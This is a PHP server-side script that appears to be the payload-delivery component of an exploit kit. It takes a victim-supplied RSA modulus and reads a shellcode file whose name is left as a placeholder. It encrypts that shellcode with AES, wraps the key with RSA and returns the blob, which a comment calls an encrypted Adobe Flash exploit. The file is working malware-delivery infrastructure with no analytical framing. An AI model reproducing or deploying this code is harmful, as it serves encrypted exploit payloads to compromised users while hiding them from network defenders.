<?php
// Libraries used for encryption
// https://github.com/phpseclib/phpseclib
include('Crypt\RSA.php');
include('Crypt\AES.php');
include('Math\BigInteger.php');

// Set HTTP header field
header('Content-Encoding: gzip');

// Set the exponent e and get the modulus n
$exponent = '010001';
$modulus_with_bitness = file_get_contents("php://input");

// Cut the first 2 bytes which describe the bitness of the payload (x86/x64)
$modulus = substr($modulus_with_bitness, 2);

// Put the shellcode payload in the same directory and change <ShellcodePayloadNameHere> according to its name
$final_payload = "<ShellcodePayloadNameHere>";

// Read file content of the shellocde payload and compress it with zlib
if (file_exists($final_payload)) {
    $payload_data = gzcompress(file_get_contents($final_payload));
}

// Encrypt the shellcode payload with a random 128-bit AES key
$aes = new Crypt_AES();
$aes->setKeyLength(128);
$key = crypt_random_string($aes->getBlockLength() >> 3);
$aes->setKey($key);
$iv = crypt_random_string($aes->getBlockLength() >> 3);
$aes->setIV($iv);
$encrypted_final_payload = $aes->encrypt($payload_data);

// Encrypt the AES key with the public RSA key (modulus + exponent)
$rsa = new Crypt_RSA();
$modulus = new Math_BigInteger(($modulus), 16);
$exponent = new Math_BigInteger(($exponent), 16);
$rsa->loadKey(array('n' => $modulus, 'e' => $exponent));
$rsa->setPublicKey(array('n' => $modulus, 'e' => $exponent));
$rsa->setEncryptionMode(CRYPT_RSA_ENCRYPTION_PKCS1);
$encrypted_aes_key = $rsa->encrypt($key);

// Create the data blob which is sent back with the following strucure
// Offset 0x0: AES key length
// Offset 0x4: Encrypted AES key
// Offset 0x44: Initialization vector (IV)
// Offset 0x54: Encrypted Adobe Flash Exploit
$data_blob = hex2bin("40000000");
$data_blob .= $encrypted_aes_key;
$data_blob .= $iv;
$data_blob .= $encrypted_final_payload;

// gzip encode the data blob and output it
echo gzencode($data_blob);
?> 